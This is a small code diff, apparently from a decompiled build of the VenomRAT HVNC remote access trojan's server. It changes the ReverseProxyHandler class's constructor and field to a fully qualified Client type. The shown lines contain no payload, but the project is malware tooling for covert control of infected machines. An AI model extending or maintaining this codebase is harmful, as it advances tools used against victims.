@@ -7,12 +7,12 @@ namespace VenomRAT_HVNC.Quasar.Server.Forms
     internal class ReverseProxyHandler
     {
         // Token: 0x0600013C RID: 316 RVA: 0x0000E7C3 File Offset: 0x0000E7C3
-        public ReverseProxyHandler(Client[] clients)
+        public ReverseProxyHandler(VenomRAT_HVNC.Server.Client[] clients)
         {
             this.clients = clients;
         }
 
         // Token: 0x040000DC RID: 220
-        private Client[] clients;
+        private VenomRAT_HVNC.Server.Client[] clients;
     }
 }
